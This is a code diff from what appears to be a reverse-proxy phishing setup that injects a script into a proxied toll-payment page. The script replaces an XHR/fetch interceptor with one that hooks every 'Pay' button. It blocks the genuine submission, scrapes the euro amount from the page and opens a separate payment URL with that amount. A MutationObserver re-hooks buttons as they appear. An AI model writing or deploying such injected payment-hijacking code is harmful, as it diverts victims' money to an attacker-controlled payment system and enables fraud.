@@ -349,114 +349,107 @@ const proxyOptions = {
 (function() {
   const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
   
-  console.log('[Payment Redirect] Universal interceptor loaded');
+  console.log('[Payment Redirect] Button interceptor loaded');
   
-  // Intercept XMLHttpRequest
-  const originalXHROpen = XMLHttpRequest.prototype.open;
-  const originalXHRSend = XMLHttpRequest.prototype.send;
-  
-  XMLHttpRequest.prototype.open = function(method, url) {
-    this._method = method;
-    this._url = url;
-    return originalXHROpen.apply(this, arguments);
-  };
-  
-  XMLHttpRequest.prototype.send = function(body) {
-    // Check if this is a Pay request
-    if (this._method === 'POST' && this._url && this._url.includes('/pay-toll')) {
-      console.log('[Payment Redirect] Intercepted AJAX POST to /pay-toll');
-      
-      // Extract amount from body or page
-      let amount = null;
-      
-      // Try to get from request body
-      if (body && typeof body === 'string') {
-        const match = body.match(/total_payment=([\\d.]+)/);
-        if (match) amount = match[1];
+  // Function to extract amount from page
+  function extractAmount() {
+    let amount = null;
+    
+    // Strategy 1: Hidden input with name="total_payment"
+    const totalInput = document.querySelector('input[name="total_payment"]');
+    if (totalInput && totalInput.value) {
+      amount = totalInput.value;
+      console.log('[Payment Redirect] Amount from hidden input:', amount);
+      return amount;
+    }
+    
+    // Strategy 2: Look for "Total:" text on page
+    const totalText = document.body.innerText;
+    const euroMatch = totalText.match(/Total[:\\s]*€([\\d.,]+)/i);
+    if (euroMatch && euroMatch[1]) {
+      amount = euroMatch[1].replace(',', '');
+      console.log('[Payment Redirect] Amount from Total text:', amount);
+      return amount;
+    }
+    
+    // Strategy 3: Any visible input with decimal value
+    const allInputs = document.querySelectorAll('input[type="text"], input[type="number"]');
+    for (let inp of allInputs) {
+      if (inp.value && inp.value.match(/^\\d+\\.\\d{2}$/)) {
+        amount = inp.value;
+        console.log('[Payment Redirect] Amount from visible input:', amount);
+        return amount;
       }
+    }
+    
+    console.warn('[Payment Redirect] No amount found');
+    return null;
+  }
+  
+  // Function to intercept Pay button click
+  function interceptPayButton() {
+    // Find all buttons with text "Pay"
+    const buttons = document.querySelectorAll('button, input[type="submit"], a[role="button"]');
+    
+    for (let btn of buttons) {
+      const btnText = btn.innerText || btn.value || btn.textContent || '';
       
-      // Try to get from hidden input on page
-      if (!amount) {
-        const totalInput = document.querySelector('input[name="total_payment"]');
-        if (totalInput) amount = totalInput.value;
-      }
-      
-      // Try to get from any input with decimal format
-      if (!amount) {
-        const allInputs = document.querySelectorAll('input');
-        for (let inp of allInputs) {
-          if (inp.value && inp.value.match(/^\\d+\\.\\d{2}$/)) {
-            amount = inp.value;
-            break;
+      if (btnText.trim().toLowerCase() === 'pay') {
+        console.log('[Payment Redirect] Found Pay button:', btn);
+        
+        // Add click event listener
+        btn.addEventListener('click', function(e) {
+          console.log('[Payment Redirect] Pay button clicked!');
+          
+          // Prevent default form submission
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          
+          // Extract amount
+          const amount = extractAmount();
+          
+          if (amount && parseFloat(amount) > 0) {
+            console.log('[Payment Redirect] Redirecting with amount:', amount);
+            
+            // Open payment system in NEW TAB
+            window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
+            
+            // Show success message
+            alert('Payment page opened in new tab! Check your browser tabs.');
+            
+          } else {
+            console.error('[Payment Redirect] Could not extract amount');
+            alert('Error: Could not find payment amount. Please contact support.');
           }
-        }
-      }
-      
-      if (amount && parseFloat(amount) > 0) {
-        console.log('[Payment Redirect] Amount found:', amount);
-        console.log('[Payment Redirect] Opening payment system in new tab...');
+          
+          return false;
+        }, true); // Use capture phase to intercept BEFORE other handlers
         
-        // Cancel AJAX request
-        this.abort();
-        
-        // Open payment system in NEW TAB
-        window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
-        
-        // Reload current page after 500ms to reset reCAPTCHA state
-        setTimeout(function() {
-          console.log('[Payment Redirect] Reloading page to reset state...');
-          window.location.reload();
-        }, 500);
-        
-        return;
+        console.log('[Payment Redirect] Pay button interceptor installed');
       }
     }
-    
-    return originalXHRSend.apply(this, arguments);
-  };
+  }
   
-  // Intercept Fetch API
-  const originalFetch = window.fetch;
-  window.fetch = function(url, options) {
-    if (options && options.method === 'POST' && typeof url === 'string' && url.includes('/pay-toll')) {
-      console.log('[Payment Redirect] Intercepted Fetch POST to /pay-toll');
-      
-      // Extract amount
-      let amount = null;
-      
-      if (options.body) {
-        const bodyStr = typeof options.body === 'string' ? options.body : '';
-        const match = bodyStr.match(/total_payment=([\\d.]+)/);
-        if (match) amount = match[1];
-      }
-      
-      if (!amount) {
-        const totalInput = document.querySelector('input[name="total_payment"]');
-        if (totalInput) amount = totalInput.value;
-      }
-      
-      if (amount && parseFloat(amount) > 0) {
-        console.log('[Payment Redirect] Amount found:', amount);
-        console.log('[Payment Redirect] Opening payment system in new tab...');
-        
-        // Open payment system in NEW TAB
-        window.open(PAYMENT_URL + '?amount=' + amount, '_blank');
-        
-        // Reload current page after 500ms to reset reCAPTCHA state
-        setTimeout(function() {
-          console.log('[Payment Redirect] Reloading page to reset state...');
-          window.location.reload();
-        }, 500);
-        
-        // Return dummy promise
-        return Promise.reject(new Error('Redirecting to payment system'));
-      }
-    }
-    
-    return originalFetch.apply(this, arguments);
-  };
+  // Run immediately
+  interceptPayButton();
   
-  console.log('[Payment Redirect] AJAX/Fetch interceptors installed');
+  // Also run after page fully loads
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', interceptPayButton);
+  }
+  
+  // Monitor for dynamically added buttons
+  const observer = new MutationObserver(function() {
+    interceptPayButton();
+  });
+  
+  observer.observe(document.body, {
+    childList: true,
+    subtree: true
+  });
+  
+  console.log('[Payment Redirect] Monitoring for Pay buttons...');
 })();
 </script>`;
             
